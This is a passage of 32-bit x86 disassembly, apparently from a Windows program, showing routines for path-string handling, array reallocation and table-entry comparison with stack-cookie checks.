  403fdd:	6a 5f                	push   $0x5f
  403fdf:	59                   	pop    %ecx
  403fe0:	66 89 0e             	mov    %cx,(%esi)
  403fe3:	eb 03                	jmp    0x403fe8
  403fe5:	6a 5f                	push   $0x5f
  403fe7:	59                   	pop    %ecx
  403fe8:	8b c7                	mov    %edi,%eax
  403fea:	83 e0 fe             	and    $0xfffffffe,%eax
  403fed:	83 f8 02             	cmp    $0x2,%eax
  403ff0:	7e 09                	jle    0x403ffb
  403ff2:	66 83 3e 3a          	cmpw   $0x3a,(%esi)
  403ff6:	75 03                	jne    0x403ffb
  403ff8:	66 89 0e             	mov    %cx,(%esi)
  403ffb:	83 c6 02             	add    $0x2,%esi
  403ffe:	83 c7 02             	add    $0x2,%edi
  404001:	66 39 2e             	cmp    %bp,(%esi)
  404004:	75 af                	jne    0x403fb5
  404006:	5f                   	pop    %edi
  404007:	5b                   	pop    %ebx
  404008:	5e                   	pop    %esi
  404009:	5d                   	pop    %ebp
  40400a:	c2 08 00             	ret    $0x8
  40400d:	56                   	push   %esi
  40400e:	8b 74 24 08          	mov    0x8(%esp),%esi
  404012:	56                   	push   %esi
  404013:	e8 1b 72 01 00       	call   0x41b233
  404018:	59                   	pop    %ecx
  404019:	85 c0                	test   %eax,%eax
  40401b:	74 06                	je     0x404023
  40401d:	8d 34 46             	lea    (%esi,%eax,2),%esi
  404020:	83 c6 fe             	add    $0xfffffffe,%esi
  404023:	8b c6                	mov    %esi,%eax
  404025:	5e                   	pop    %esi
  404026:	c2 04 00             	ret    $0x4
  404029:	53                   	push   %ebx
  40402a:	56                   	push   %esi
  40402b:	8b 74 24 0c          	mov    0xc(%esp),%esi
  40402f:	57                   	push   %edi
  404030:	56                   	push   %esi
  404031:	e8 fd 71 01 00       	call   0x41b233
  404036:	8b f8                	mov    %eax,%edi
  404038:	83 ef 01             	sub    $0x1,%edi
  40403b:	59                   	pop    %ecx
  40403c:	78 18                	js     0x404056
  40403e:	8d 1c 7e             	lea    (%esi,%edi,2),%ebx
  404041:	0f b7 03             	movzwl (%ebx),%eax
  404044:	50                   	push   %eax
  404045:	e8 69 fe ff ff       	call   0x403eb3
  40404a:	84 c0                	test   %al,%al
  40404c:	75 20                	jne    0x40406e
  40404e:	83 eb 02             	sub    $0x2,%ebx
  404051:	83 ef 01             	sub    $0x1,%edi
  404054:	79 eb                	jns    0x404041
  404056:	66 83 3e 00          	cmpw   $0x0,(%esi)
  40405a:	74 0a                	je     0x404066
  40405c:	66 83 7e 02 3a       	cmpw   $0x3a,0x2(%esi)
  404061:	75 03                	jne    0x404066
  404063:	83 c6 04             	add    $0x4,%esi
  404066:	8b c6                	mov    %esi,%eax
  404068:	5f                   	pop    %edi
  404069:	5e                   	pop    %esi
  40406a:	5b                   	pop    %ebx
  40406b:	c2 04 00             	ret    $0x4
  40406e:	8d 43 02             	lea    0x2(%ebx),%eax
  404071:	eb f5                	jmp    0x404068
  404073:	56                   	push   %esi
  404074:	8b 74 24 08          	mov    0x8(%esp),%esi
  404078:	56                   	push   %esi
  404079:	e8 ab ff ff ff       	call   0x404029
  40407e:	8d 4e 04             	lea    0x4(%esi),%ecx
  404081:	3b c1                	cmp    %ecx,%eax
  404083:	72 11                	jb     0x404096
  404085:	66 83 7e 02 3a       	cmpw   $0x3a,0x2(%esi)
  40408a:	75 07                	jne    0x404093
  40408c:	8d 4e 08             	lea    0x8(%esi),%ecx
  40408f:	3b c1                	cmp    %ecx,%eax
  404091:	72 03                	jb     0x404096
  404093:	83 e8 02             	sub    $0x2,%eax
  404096:	33 c9                	xor    %ecx,%ecx
  404098:	66 89 08             	mov    %cx,(%eax)
  40409b:	5e                   	pop    %esi
  40409c:	c2 04 00             	ret    $0x4
  40409f:	55                   	push   %ebp
  4040a0:	8b ec                	mov    %esp,%ebp
  4040a2:	56                   	push   %esi
  4040a3:	8b 75 08             	mov    0x8(%ebp),%esi
  4040a6:	85 f6                	test   %esi,%esi
  4040a8:	74 35                	je     0x4040df
  4040aa:	66 83 3e 00          	cmpw   $0x0,(%esi)
  4040ae:	74 2f                	je     0x4040df
  4040b0:	56                   	push   %esi
  4040b1:	e8 a0 fa ff ff       	call   0x403b56
  4040b6:	85 c0                	test   %eax,%eax
  4040b8:	74 05                	je     0x4040bf
  4040ba:	33 c9                	xor    %ecx,%ecx
  4040bc:	66 89 08             	mov    %cx,(%eax)
  4040bf:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  4040c3:	74 1a                	je     0x4040df
  4040c5:	ff 75 10             	push   0x10(%ebp)
  4040c8:	68 e0 a5 42 00       	push   $0x42a5e0
  4040cd:	56                   	push   %esi
  4040ce:	e8 7c 2f 00 00       	call   0x40704f
  4040d3:	ff 75 10             	push   0x10(%ebp)
  4040d6:	ff 75 0c             	push   0xc(%ebp)
  4040d9:	56                   	push   %esi
  4040da:	e8 70 2f 00 00       	call   0x40704f
  4040df:	5e                   	pop    %esi
  4040e0:	5d                   	pop    %ebp
  4040e1:	c2 0c 00             	ret    $0xc
  4040e4:	ff 74 24 04          	push   0x4(%esp)
  4040e8:	e8 3c ff ff ff       	call   0x404029
  4040ed:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  4040f1:	8b d0                	mov    %eax,%edx
  4040f3:	2b 54 24 04          	sub    0x4(%esp),%edx
  4040f7:	d1 fa                	sar    $1,%edx
  4040f9:	2b ca                	sub    %edx,%ecx
  4040fb:	51                   	push   %ecx
  4040fc:	ff 74 24 0c          	push   0xc(%esp)
  404100:	50                   	push   %eax
  404101:	e8 71 2f 00 00       	call   0x407077
  404106:	c2 0c 00             	ret    $0xc
  404109:	8b 54 24 08          	mov    0x8(%esp),%edx
  40410d:	33 c9                	xor    %ecx,%ecx
  40410f:	53                   	push   %ebx
  404110:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  404114:	83 eb 01             	sub    $0x1,%ebx
  404117:	74 28                	je     0x404141
  404119:	56                   	push   %esi
  40411a:	8b 74 24 0c          	mov    0xc(%esp),%esi
  40411e:	8b c2                	mov    %edx,%eax
  404120:	2b f2                	sub    %edx,%esi
  404122:	57                   	push   %edi
  404123:	0f b7 3c 06          	movzwl (%esi,%eax,1),%edi
  404127:	66 85 ff             	test   %di,%di
  40412a:	74 13                	je     0x40413f
  40412c:	83 ff 2f             	cmp    $0x2f,%edi
  40412f:	75 03                	jne    0x404134
  404131:	6a 5c                	push   $0x5c
  404133:	5f                   	pop    %edi
  404134:	66 89 38             	mov    %di,(%eax)
  404137:	41                   	inc    %ecx
  404138:	83 c0 02             	add    $0x2,%eax
  40413b:	3b cb                	cmp    %ebx,%ecx
  40413d:	72 e4                	jb     0x404123
  40413f:	5f                   	pop    %edi
  404140:	5e                   	pop    %esi
  404141:	33 c0                	xor    %eax,%eax
  404143:	66 89 04 4a          	mov    %ax,(%edx,%ecx,2)
  404147:	5b                   	pop    %ebx
  404148:	c2 0c 00             	ret    $0xc
  40414b:	51                   	push   %ecx
  40414c:	33 c0                	xor    %eax,%eax
  40414e:	89 0c 24             	mov    %ecx,(%esp)
  404151:	89 01                	mov    %eax,(%ecx)
  404153:	89 41 04             	mov    %eax,0x4(%ecx)
  404156:	89 41 08             	mov    %eax,0x8(%ecx)
  404159:	89 41 0c             	mov    %eax,0xc(%ecx)
  40415c:	89 41 10             	mov    %eax,0x10(%ecx)
  40415f:	89 41 14             	mov    %eax,0x14(%ecx)
  404162:	89 41 18             	mov    %eax,0x18(%ecx)
  404165:	89 41 1c             	mov    %eax,0x1c(%ecx)
  404168:	89 41 20             	mov    %eax,0x20(%ecx)
  40416b:	89 41 24             	mov    %eax,0x24(%ecx)
  40416e:	89 41 28             	mov    %eax,0x28(%ecx)
  404171:	89 41 2c             	mov    %eax,0x2c(%ecx)
  404174:	89 41 30             	mov    %eax,0x30(%ecx)
  404177:	89 41 34             	mov    %eax,0x34(%ecx)
  40417a:	89 41 38             	mov    %eax,0x38(%ecx)
  40417d:	89 41 3c             	mov    %eax,0x3c(%ecx)
  404180:	89 41 40             	mov    %eax,0x40(%ecx)
  404183:	89 41 44             	mov    %eax,0x44(%ecx)
  404186:	89 41 48             	mov    %eax,0x48(%ecx)
  404189:	89 41 4c             	mov    %eax,0x4c(%ecx)
  40418c:	88 41 50             	mov    %al,0x50(%ecx)
  40418f:	8b c1                	mov    %ecx,%eax
  404191:	59                   	pop    %ecx
  404192:	c3                   	ret
  404193:	55                   	push   %ebp
  404194:	56                   	push   %esi
  404195:	57                   	push   %edi
  404196:	8b f9                	mov    %ecx,%edi
  404198:	33 f6                	xor    %esi,%esi
  40419a:	8d 6f 20             	lea    0x20(%edi),%ebp
  40419d:	39 77 24             	cmp    %esi,0x24(%edi)
  4041a0:	76 27                	jbe    0x4041c9
  4041a2:	53                   	push   %ebx
  4041a3:	8b de                	mov    %esi,%ebx
  4041a5:	8b 45 00             	mov    0x0(%ebp),%eax
  4041a8:	ff 74 03 04          	push   0x4(%ebx,%eax,1)
  4041ac:	e8 f8 72 01 00       	call   0x41b4a9
  4041b1:	8b 45 00             	mov    0x0(%ebp),%eax
  4041b4:	ff 74 03 08          	push   0x8(%ebx,%eax,1)
  4041b8:	e8 ec 72 01 00       	call   0x41b4a9
  4041bd:	46                   	inc    %esi
  4041be:	8d 5b 0c             	lea    0xc(%ebx),%ebx
  4041c1:	59                   	pop    %ecx
  4041c2:	59                   	pop    %ecx
  4041c3:	3b 77 24             	cmp    0x24(%edi),%esi
  4041c6:	72 dd                	jb     0x4041a5
  4041c8:	5b                   	pop    %ebx
  4041c9:	8d 4f 40             	lea    0x40(%edi),%ecx
  4041cc:	e8 58 d1 ff ff       	call   0x401329
  4041d1:	8d 4f 30             	lea    0x30(%edi),%ecx
  4041d4:	e8 50 d1 ff ff       	call   0x401329
  4041d9:	8b cd                	mov    %ebp,%ecx
  4041db:	e8 49 d1 ff ff       	call   0x401329
  4041e0:	8d 4f 10             	lea    0x10(%edi),%ecx
  4041e3:	e8 41 d1 ff ff       	call   0x401329
  4041e8:	8b cf                	mov    %edi,%ecx
  4041ea:	5f                   	pop    %edi
  4041eb:	5e                   	pop    %esi
  4041ec:	5d                   	pop    %ebp
  4041ed:	e9 37 d1 ff ff       	jmp    0x401329
  4041f2:	56                   	push   %esi
  4041f3:	8b f1                	mov    %ecx,%esi
  4041f5:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  4041f9:	03 4e 04             	add    0x4(%esi),%ecx
  4041fc:	89 4e 04             	mov    %ecx,0x4(%esi)
  4041ff:	3b 4e 08             	cmp    0x8(%esi),%ecx
  404202:	76 62                	jbe    0x404266
  404204:	8b 46 0c             	mov    0xc(%esi),%eax
  404207:	53                   	push   %ebx
  404208:	55                   	push   %ebp
  404209:	bd ac bd 45 00       	mov    $0x45bdac,%ebp
  40420e:	57                   	push   %edi
  40420f:	85 c0                	test   %eax,%eax
  404211:	74 1a                	je     0x40422d
  404213:	3b c8                	cmp    %eax,%ecx
  404215:	76 16                	jbe    0x40422d
  404217:	50                   	push   %eax
  404218:	68 18 a7 42 00       	push   $0x42a718
  40421d:	55                   	push   %ebp
  40421e:	e8 c5 d6 ff ff       	call   0x4018e8
  404223:	83 c4 0c             	add    $0xc,%esp
  404226:	8b cd                	mov    %ebp,%ecx
  404228:	e8 40 d7 ff ff       	call   0x40196d
  40422d:	8b 46 08             	mov    0x8(%esi),%eax
  404230:	8b 7e 04             	mov    0x4(%esi),%edi
  404233:	c1 e8 02             	shr    $0x2,%eax
  404236:	83 c0 20             	add    $0x20,%eax
  404239:	03 46 08             	add    0x8(%esi),%eax
  40423c:	3b f8                	cmp    %eax,%edi
  40423e:	77 02                	ja     0x404242
  404240:	8b f8                	mov    %eax,%edi
  404242:	8b c7                	mov    %edi,%eax
  404244:	c1 e0 02             	shl    $0x2,%eax
  404247:	50                   	push   %eax
  404248:	ff 36                	push   (%esi)
  40424a:	e8 49 94 01 00       	call   0x41d698
  40424f:	8b d8                	mov    %eax,%ebx
  404251:	59                   	pop    %ecx
  404252:	59                   	pop    %ecx
  404253:	85 db                	test   %ebx,%ebx
  404255:	75 07                	jne    0x40425e
  404257:	8b cd                	mov    %ebp,%ecx
  404259:	e8 0f d7 ff ff       	call   0x40196d
  40425e:	89 7e 08             	mov    %edi,0x8(%esi)
  404261:	5f                   	pop    %edi
  404262:	5d                   	pop    %ebp
  404263:	89 1e                	mov    %ebx,(%esi)
  404265:	5b                   	pop    %ebx
  404266:	5e                   	pop    %esi
  404267:	c2 04 00             	ret    $0x4
  40426a:	56                   	push   %esi
  40426b:	8b f1                	mov    %ecx,%esi
  40426d:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  404271:	03 4e 04             	add    0x4(%esi),%ecx
  404274:	89 4e 04             	mov    %ecx,0x4(%esi)
  404277:	3b 4e 08             	cmp    0x8(%esi),%ecx
  40427a:	76 60                	jbe    0x4042dc
  40427c:	8b 46 0c             	mov    0xc(%esi),%eax
  40427f:	53                   	push   %ebx
  404280:	55                   	push   %ebp
  404281:	bd ac bd 45 00       	mov    $0x45bdac,%ebp
  404286:	57                   	push   %edi
  404287:	85 c0                	test   %eax,%eax
  404289:	74 1a                	je     0x4042a5
  40428b:	3b c8                	cmp    %eax,%ecx
  40428d:	76 16                	jbe    0x4042a5
  40428f:	50                   	push   %eax
  404290:	68 18 a7 42 00       	push   $0x42a718
  404295:	55                   	push   %ebp
  404296:	e8 4d d6 ff ff       	call   0x4018e8
  40429b:	83 c4 0c             	add    $0xc,%esp
  40429e:	8b cd                	mov    %ebp,%ecx
  4042a0:	e8 c8 d6 ff ff       	call   0x40196d
  4042a5:	8b 46 08             	mov    0x8(%esi),%eax
  4042a8:	8b 7e 04             	mov    0x4(%esi),%edi
  4042ab:	c1 e8 02             	shr    $0x2,%eax
  4042ae:	83 c0 20             	add    $0x20,%eax
  4042b1:	03 46 08             	add    0x8(%esi),%eax
  4042b4:	3b f8                	cmp    %eax,%edi
  4042b6:	77 02                	ja     0x4042ba
  4042b8:	8b f8                	mov    %eax,%edi
  4042ba:	6b c7 0c             	imul   $0xc,%edi,%eax
  4042bd:	50                   	push   %eax
  4042be:	ff 36                	push   (%esi)
  4042c0:	e8 d3 93 01 00       	call   0x41d698
  4042c5:	8b d8                	mov    %eax,%ebx
  4042c7:	59                   	pop    %ecx
  4042c8:	59                   	pop    %ecx
  4042c9:	85 db                	test   %ebx,%ebx
  4042cb:	75 07                	jne    0x4042d4
  4042cd:	8b cd                	mov    %ebp,%ecx
  4042cf:	e8 99 d6 ff ff       	call   0x40196d
  4042d4:	89 7e 08             	mov    %edi,0x8(%esi)
  4042d7:	5f                   	pop    %edi
  4042d8:	5d                   	pop    %ebp
  4042d9:	89 1e                	mov    %ebx,(%esi)
  4042db:	5b                   	pop    %ebx
  4042dc:	5e                   	pop    %esi
  4042dd:	c2 04 00             	ret    $0x4
  4042e0:	55                   	push   %ebp
  4042e1:	8d 6c 24 90          	lea    -0x70(%esp),%ebp
  4042e5:	81 ec a4 00 00 00    	sub    $0xa4,%esp
  4042eb:	a1 5c 56 43 00       	mov    0x43565c,%eax
  4042f0:	33 c5                	xor    %ebp,%eax
  4042f2:	89 45 6c             	mov    %eax,0x6c(%ebp)
  4042f5:	8b 45 78             	mov    0x78(%ebp),%eax
  4042f8:	8b 4d 7c             	mov    0x7c(%ebp),%ecx
  4042fb:	56                   	push   %esi
  4042fc:	57                   	push   %edi
  4042fd:	6b 38 0c             	imul   $0xc,(%eax),%edi
  404300:	8d 45 cc             	lea    -0x34(%ebp),%eax
  404303:	8b 31                	mov    (%ecx),%esi
  404305:	6a 50                	push   $0x50
  404307:	ff b7 58 51 43 00    	push   0x435158(%edi)
  40430d:	50                   	push   %eax
  40430e:	e8 09 2d 00 00       	call   0x40701c
  404313:	8d 45 cc             	lea    -0x34(%ebp),%eax
  404316:	6a 3a                	push   $0x3a
  404318:	50                   	push   %eax
  404319:	e8 52 40 01 00       	call   0x418370
  40431e:	59                   	pop    %ecx
  40431f:	59                   	pop    %ecx
  404320:	85 c0                	test   %eax,%eax
  404322:	74 03                	je     0x404327
  404324:	c6 00 00             	movb   $0x0,(%eax)
  404327:	6b f6 0c             	imul   $0xc,%esi,%esi
  40432a:	8d 45 1c             	lea    0x1c(%ebp),%eax
  40432d:	6a 50                	push   $0x50
  40432f:	ff b6 58 51 43 00    	push   0x435158(%esi)
  404335:	50                   	push   %eax
  404336:	e8 e1 2c 00 00       	call   0x40701c
  40433b:	8d 45 1c             	lea    0x1c(%ebp),%eax
  40433e:	6a 3a                	push   $0x3a
  404340:	50                   	push   %eax
  404341:	e8 2a 40 01 00       	call   0x418370
  404346:	59                   	pop    %ecx
  404347:	59                   	pop    %ecx
  404348:	85 c0                	test   %eax,%eax
  40434a:	74 03                	je     0x40434f
  40434c:	c6 00 00             	movb   $0x0,(%eax)
  40434f:	8d 45 1c             	lea    0x1c(%ebp),%eax
  404352:	50                   	push   %eax
  404353:	8d 45 cc             	lea    -0x34(%ebp),%eax
  404356:	50                   	push   %eax
  404357:	e8 a4 98 01 00       	call   0x41dc00
  40435c:	59                   	pop    %ecx
  40435d:	59                   	pop    %ecx
  40435e:	85 c0                	test   %eax,%eax
  404360:	75 18                	jne    0x40437a
  404362:	8b 87 54 51 43 00    	mov    0x435154(%edi),%eax
  404368:	3b 86 54 51 43 00    	cmp    0x435154(%esi),%eax
  40436e:	75 04                	jne    0x404374
  404370:	33 c0                	xor    %eax,%eax
  404372:	eb 06                	jmp    0x40437a
  404374:	1b c0                	sbb    %eax,%eax
  404376:	83 e0 fe             	and    $0xfffffffe,%eax
  404379:	40                   	inc    %eax
  40437a:	8b 4d 6c             	mov    0x6c(%ebp),%ecx
  40437d:	5f                   	pop    %edi
  40437e:	33 cd                	xor    %ebp,%ecx
  404380:	5e                   	pop    %esi
  404381:	e8 d3 21 01 00       	call   0x416559
  404386:	83 c5 70             	add    $0x70,%ebp
  404389:	c9                   	leave
  40438a:	c3                   	ret
  40438b:	cc                   	int3
  40438c:	cc                   	int3
  40438d:	cc                   	int3
  40438e:	cc                   	int3
  40438f:	cc                   	int3
  404390:	8b 44 24 04          	mov    0x4(%esp),%eax
  404394:	8b 08                	mov    (%eax),%ecx
  404396:	8b 44 24 08          	mov    0x8(%esp),%eax
  40439a:	6b 00 0c             	imul   $0xc,(%eax),%eax
  40439d:	ff b0 58 51 43 00    	push   0x435158(%eax)
  4043a3:	6b c1 0c             	imul   $0xc,%ecx,%eax
  4043a6:	ff b0 58 51 43 00    	push   0x435158(%eax)
  4043ac:	e8 4f 98 01 00       	call   0x41dc00
  4043b1:	59                   	pop    %ecx
  4043b2:	59                   	pop    %ecx
  4043b3:	c3                   	ret
  4043b4:	cc                   	int3
  4043b5:	cc                   	int3
  4043b6:	cc                   	int3
  4043b7:	cc                   	int3
  4043b8:	cc                   	int3
  4043b9:	cc                   	int3
  4043ba:	cc                   	int3
  4043bb:	cc                   	int3
  4043bc:	cc                   	int3
  4043bd:	cc                   	int3
  4043be:	cc                   	int3
  4043bf:	cc                   	int3
  4043c0:	55                   	push   %ebp
  4043c1:	8b ec                	mov    %esp,%ebp
  4043c3:	83 ec 54             	sub    $0x54,%esp
  4043c6:	a1 5c 56 43 00       	mov    0x43565c,%eax
  4043cb:	33 c5                	xor    %ebp,%eax
  4043cd:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4043d0:	8b 45 0c             	mov    0xc(%ebp),%eax
  4043d3:	56                   	push   %esi
  4043d4:	8b 75 08             	mov    0x8(%ebp),%esi
  4043d7:	57                   	push   %edi
  4043d8:	6b 38 0c             	imul   $0xc,(%eax),%edi
  4043db:	8d 45 ac             	lea    -0x54(%ebp),%eax
  4043de:	6a 50                	push   $0x50
  4043e0:	ff b7 58 51 43 00    	push   0x435158(%edi)
  4043e6:	50                   	push   %eax
  4043e7:	e8 30 2c 00 00       	call   0x40701c
  4043ec:	8d 45 ac             	lea    -0x54(%ebp),%eax
  4043ef:	6a 3a                	push   $0x3a
  4043f1:	50                   	push   %eax
  4043f2:	e8 79 3f 01 00       	call   0x418370
  4043f7:	59                   	pop    %ecx
  4043f8:	59                   	pop    %ecx
  4043f9:	85 c0                	test   %eax,%eax
  4043fb:	74 03                	je     0x404400
  4043fd:	c6 00 00             	movb   $0x0,(%eax)
  404400:	8d 45 ac             	lea    -0x54(%ebp),%eax
  404403:	50                   	push   %eax
  404404:	ff 76 08             	push   0x8(%esi)
  404407:	e8 f4 97 01 00       	call   0x41dc00
  40440c:	59                   	pop    %ecx
  40440d:	59                   	pop    %ecx
  40440e:	85 c0                	test   %eax,%eax
  404410:	75 15                	jne    0x404427
  404412:	8b 87 54 51 43 00    	mov    0x435154(%edi),%eax
  404418:	39 46 04             	cmp    %eax,0x4(%esi)
  40441b:	75 04                	jne    0x404421
  40441d:	33 c0                	xor    %eax,%eax
  40441f:	eb 06                	jmp    0x404427
  404421:	1b c0                	sbb    %eax,%eax
  404423:	83 e0 fe             	and    $0xfffffffe,%eax
  404426:	40                   	inc    %eax
  404427:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40442a:	5f                   	pop    %edi
  40442b:	33 cd                	xor    %ebp,%ecx
  40442d:	5e                   	pop    %esi
  40442e:	e8 26 21 01 00       	call   0x416559
  404433:	c9                   	leave
  404434:	c3                   	ret
  404435:	cc                   	int3
  404436:	cc                   	int3
  404437:	cc                   	int3
  404438:	cc                   	int3
  404439:	cc                   	int3
  40443a:	cc                   	int3
  40443b:	cc                   	int3
  40443c:	cc                   	int3
  40443d:	cc                   	int3
  40443e:	cc                   	int3
  40443f:	cc                   	int3
  404440:	8b 44 24 08          	mov    0x8(%esp),%eax
  404444:	6b 00 0c             	imul   $0xc,(%eax),%eax
  404447:	ff b0 58 51 43 00    	push   0x435158(%eax)
  40444d:	ff 74 24 08          	push   0x8(%esp)
  404451:	e8 aa 97 01 00       	call   0x41dc00
  404456:	59                   	pop    %ecx
  404457:	59                   	pop    %ecx
  404458:	c3                   	ret
  404459:	cc                   	int3
  40445a:	cc                   	int3
  40445b:	cc                   	int3
  40445c:	cc                   	int3
  40445d:	cc                   	int3
  40445e:	cc                   	int3
  40445f:	cc                   	int3
  404460:	8b 44 24 04          	mov    0x4(%esp),%eax
  404464:	8b 0d 2c 7f 43 00    	mov    0x437f2c,%ecx
  40446a:	6b 00 0c             	imul   $0xc,(%eax),%eax
  40446d:	8b 14 08             	mov    (%eax,%ecx,1),%edx
  404470:	8b 44 24 08          	mov    0x8(%esp),%eax
  404474:	6b 00 0c             	imul   $0xc,(%eax),%eax
  404477:	3b 14 08             	cmp    (%eax,%ecx,1),%edx
  40447a:	75 03                	jne    0x40447f
  40447c:	33 c0                	xor    %eax,%eax
  40447e:	c3                   	ret
  40447f:	1b c0                	sbb    %eax,%eax
  404481:	83 e0 fe             	and    $0xfffffffe,%eax
  404484:	40                   	inc    %eax
  404485:	c3                   	ret
  404486:	cc                   	int3
  404487:	cc                   	int3
  404488:	cc                   	int3
  404489:	cc                   	int3
  40448a:	cc                   	int3
  40448b:	cc                   	int3
  40448c:	cc                   	int3
  40448d:	cc                   	int3
  40448e:	cc                   	int3
  40448f:	cc                   	int3
  404490:	8b 44 24 04          	mov    0x4(%esp),%eax
  404494:	8b 0d 2c 7f 43 00    	mov    0x437f2c,%ecx
  40449a:	8b 10                	mov    (%eax),%edx
  40449c:	8b 44 24 08          	mov    0x8(%esp),%eax
  4044a0:	6b 00 0c             	imul   $0xc,(%eax),%eax
  4044a3:	ff 74 08 04          	push   0x4(%eax,%ecx,1)
  4044a7:	6b c2 0c             	imul   $0xc,%edx,%eax
  4044aa:	ff 74 08 04          	push   0x4(%eax,%ecx,1)
  4044ae:	e8 4d 97 01 00       	call   0x41dc00
  4044b3:	59                   	pop    %ecx
  4044b4:	59                   	pop    %ecx
  4044b5:	c3                   	ret
  4044b6:	cc                   	int3
  4044b7:	cc                   	int3
  4044b8:	cc                   	int3
  4044b9:	cc                   	int3
  4044ba:	cc                   	int3
  4044bb:	cc                   	int3
  4044bc:	cc                   	int3
  4044bd:	cc                   	int3
  4044be:	cc                   	int3
  4044bf:	cc                   	int3
  4044c0:	8b 44 24 08          	mov    0x8(%esp),%eax
  4044c4:	6b 08 0c             	imul   $0xc,(%eax),%ecx
  4044c7:	a1 2c 7f 43 00       	mov    0x437f2c,%eax
  4044cc:	ff 74 01 04          	push   0x4(%ecx,%eax,1)
  4044d0:	ff 74 24 08          	push   0x8(%esp)
  4044d4:	e8 27 97 01 00       	call   0x41dc00
  4044d9:	59                   	pop    %ecx
  4044da:	59                   	pop    %ecx
  4044db:	c3                   	ret
  4044dc:	55                   	push   %ebp
  4044dd:	8b ec                	mov    %esp,%ebp
  4044df:	81 ec 04 04 00 00    	sub    $0x404,%esp
  4044e5:	a1 5c 56 43 00       	mov    0x43565c,%eax
  4044ea:	33 c5                	xor    %ebp,%eax
  4044ec:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4044ef:	8b 45 08             	mov    0x8(%ebp),%eax
  4044f2:	8d 95 fc fb ff ff    	lea    -0x404(%ebp),%edx
  4044f8:	53                   	push   %ebx
  4044f9:	8b 5d 10             	mov    0x10(%ebp),%ebx
  4044fc:	56                   	push   %esi
  4044fd:	57                   	push   %edi
  4044fe:	8b 7d 0c             	mov    0xc(%ebp),%edi
  404501:	68 00 02 00 00       	push   $0x200
  404506:	52                   	push   %edx
  404507:	68 0c a7 42 00       	push   $0x42a70c
  40450c:	50                   	push   %eax
  40450d:	e8 5d 00 00 00       	call   0x40456f
  404512:	84 c0                	test   %al,%al
  404514:	74 46                	je     0x40455c
  404516:	8d 85 fc fb ff ff    	lea    -0x404(%ebp),%eax
  40451c:	6a 2a                	push   $0x2a
  40451e:	50                   	push   %eax
  40451f:	e8 7c 36 01 00       	call   0x417ba0
  404524:	8b f0                	mov    %eax,%esi
  404526:	59                   	pop    %ecx
  404527:	59                   	pop    %ecx
  404528:	85 f6                	test   %esi,%esi
  40452a:	74 30                	je     0x40455c
  40452c:	8d 85 fc fb ff ff    	lea    -0x404(%ebp),%eax
  404532:	50                   	push   %eax
  404533:	e8 00 40 00 00       	call   0x408538
  404538:	89 07                	mov    %eax,(%edi)
  40453a:	8d 46 02             	lea    0x2(%esi),%eax
  40453d:	50                   	push   %eax
  40453e:	e8 f5 3f 00 00       	call   0x408538
  404543:	89 03                	mov    %eax,(%ebx)
  404545:	83 3f 64             	cmpl   $0x64,(%edi)
  404548:	75 05                	jne    0x40454f
  40454a:	83 f8 64             	cmp    $0x64,%eax
  40454d:	74 0d                	je     0x40455c
  40454f:	83 3f 00             	cmpl   $0x0,(%edi)
  404552:	7e 08                	jle    0x40455c
  404554:	85 c0                	test   %eax,%eax
  404556:	7e 04                	jle    0x40455c
  404558:	b0 01                	mov    $0x1,%al
  40455a:	eb 02                	jmp    0x40455e
  40455c:	32 c0                	xor    %al,%al
  40455e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404561:	5f                   	pop    %edi
  404562:	5e                   	pop    %esi
  404563:	33 cd                	xor    %ebp,%ecx
  404565:	5b                   	pop    %ebx
  404566:	e8 ee 1f 01 00       	call   0x416559
  40456b:	c9                   	leave
  40456c:	c2 0c 00             	ret    $0xc
  40456f:	55                   	push   %ebp
  404570:	8b ec                	mov    %esp,%ebp
  404572:	81 ec f4 00 00 00    	sub    $0xf4,%esp
  404578:	a1 5c 56 43 00       	mov    0x43565c,%eax
  40457d:	33 c5                	xor    %ebp,%eax
  40457f:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404582:	8b 45 0c             	mov    0xc(%ebp),%eax
  404585:	56                   	push   %esi
  404586:	8b 75 10             	mov    0x10(%ebp),%esi
  404589:	57                   	push   %edi
  40458a:	50                   	push   %eax
  40458b:	8b f9                	mov    %ecx,%edi
  40458d:	8d 85 0c ff ff ff    	lea    -0xf4(%ebp),%eax
  404593:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404596:	51                   	push   %ecx
  404597:	68 e0 a6 42 00       	push   $0x42a6e0
  40459c:	6a 50                	push   $0x50
  40459e:	50                   	push   %eax
  40459f:	e8 19 eb ff ff       	call   0x4030bd
  4045a4:	83 c4 14             	add    $0x14,%esp
  4045a7:	8d 45 ac             	lea    -0x54(%ebp),%eax
  4045aa:	6a 50                	push   $0x50
  4045ac:	50                   	push   %eax
  4045ad:	8d 85 0c ff ff ff    	lea    -0xf4(%ebp),%eax
  4045b3:	50                   	push   %eax
  4045b4:	e8 b5 3d 00 00       	call   0x40836e
  4045b9:	ff 75 14             	push   0x14(%ebp)
  4045bc:	8d 45 ac             	lea    -0x54(%ebp),%eax
  4045bf:	8b cf                	mov    %edi,%ecx
  4045c1:	56                   	push   %esi
  4045c2:	50                   	push   %eax
  4045c3:	e8 44 01 00 00       	call   0x40470c
  4045c8:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4045cb:	5f                   	pop    %edi
  4045cc:	33 cd                	xor    %ebp,%ecx
  4045ce:	5e                   	pop    %esi
  4045cf:	e8 85 1f 01 00       	call   0x416559
  4045d4:	c9                   	leave
  4045d5:	c2 10 00             	ret    $0x10
  4045d8:	55                   	push   %ebp
  4045d9:	8d 6c 24 9c          	lea    -0x64(%esp),%ebp
  4045dd:	81 ec b0 00 00 00    	sub    $0xb0,%esp
  4045e3:	a1 5c 56 43 00       	mov    0x43565c,%eax
  4045e8:	33 c5                	xor    %ebp,%eax
  4045ea:	89 45 60             	mov    %eax,0x60(%ebp)
  4045ed:	56                   	push   %esi
  4045ee:	8b f1                	mov    %ecx,%esi
  4045f0:	8b 4d 74             	mov    0x74(%ebp),%ecx
  4045f3:	57                   	push   %edi
  4045f4:	8b 7d 78             	mov    0x78(%ebp),%edi
